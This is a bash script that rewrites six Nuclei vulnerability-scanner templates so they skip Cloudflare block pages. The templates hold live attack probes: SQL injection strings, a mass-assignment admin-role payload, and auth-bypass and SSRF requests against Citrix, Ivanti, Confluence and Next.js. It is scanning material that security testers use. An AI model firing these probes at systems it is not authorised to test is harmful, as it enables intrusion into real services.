#!/bin/bash
# K70n0s510 CLOUDFLARE PATCH
# Updates noisy templates to ignore Cloudflare WAF pages.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"

echo "☁️ Applying Cloudflare Silencers..."

# 1. Update SQLi Boolean (Critical Noise)
cat <<EOF > "$BASE_DIR/A03-injection/sqli-godmode/sqli-boolean.yaml"
id: K70n0s510-sqli-boolean
info:
  name: Boolean Blind SQLi (AND 1=1)
  author: K70n0s510
  severity: critical
  tags: sqli,blind
http:
  - method: GET
    path: ["{{BaseURL}}/?id=1' AND 1=1--", "{{BaseURL}}/?id=1' AND 1=0--"]
    matchers-condition: and
    matchers:
      - type: dsl
        dsl: ["len(body_1) != len(body_2)"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "Attention Required", "security by cloudflare", "Just a moment"]
        negative: true
EOF

# 2. Update Mass Assignment (High Noise)
cat <<EOF > "$BASE_DIR/A04-insecure-design/logic-nuclear/mass-assignment.yaml"
id: K70n0s510-mass-assignment
info:
  name: JSON Mass Assignment
  author: K70n0s510
  severity: high
  tags: a04,logic,api
http:
  - method: POST
    path: ["{{BaseURL}}/api/users", "{{BaseURL}}/api/register"]
    headers: {Content-Type: "application/json"}
    body: '{"role":"admin","is_admin":true}'
    matchers-condition: and
    matchers:
      - type: word
        words: ["\"role\":\"admin\"", "\"is_admin\":true"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "error code: 1020", "Access denied"]
        negative: true
EOF

# 3. Update Citrix RCE (Critical Noise)
cat <<EOF > "$BASE_DIR/A101-2025-nuclear/CVE-2025-7775-citrix.yaml"
id: CVE-2025-7775
info:
  name: Citrix NetScaler Memory Overflow
  author: K70n0s510
  severity: critical
  tags: cve,cve2025,citrix,rce
http:
  - method: GET
    path: ["{{BaseURL}}/vpn/index.html"]
    headers: {Cookie: "NSC_AAAC=AAAAAAAAAAAAAAAAAAAAAA"}
    matchers-condition: and
    matchers:
      - type: status
        status: [500, 403]
      - type: word
        words: ["Citrix NetScaler", "unpredictable state"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "Attention Required"]
        negative: true
EOF

# 4. Update Ivanti Auth Bypass
cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2023-46805-ivanti.yaml"
id: CVE-2023-46805
info:
  name: Ivanti Connect Secure Auth Bypass
  author: K70n0s510
  severity: critical
  tags: cve,cve2023,ivanti,auth-bypass
http:
  - method: GET
    path: ["{{BaseURL}}/api/v1/totp/user-backup-code/../../system/system-information"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["system-information"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "Attention Required"]
        negative: true
EOF

# 5. Update Confluence Auth Bypass
cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2023-22515-confluence.yaml"
id: CVE-2023-22515
info:
  name: Atlassian Confluence Auth Bypass
  author: K70n0s510
  severity: critical
  tags: cve,cve2023,confluence
http:
  - method: GET
    path: ["{{BaseURL}}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"]
    matchers-condition: and
    matchers:
      - type: word
        words: ["success", "setupComplete"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "Attention Required"]
        negative: true
EOF

# 6. Update React SSRF (New)
cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2024-34351-react-ssrf.yaml"
id: CVE-2024-34351-react-ssrf
info:
  name: React/Next.js Server Actions SSRF
  author: K70n0s510
  severity: critical
  tags: cve,cve2024,react,ssrf
http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{interactsh-url}}
        Content-Type: text/plain
        Next-Action: 26db376097725927517e52b2203362095924713c
        Next-Router-State-Tree: %7B%22src%22%3A%22%22%7D

        {}
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words: ["http", "dns"]
      # CLOUDFLARE FIX
      - type: word
        words: ["Cloudflare", "Attention Required"]
        negative: true
EOF

echo "✅ Cloudflare Patch Applied to 6 Critical Templates."
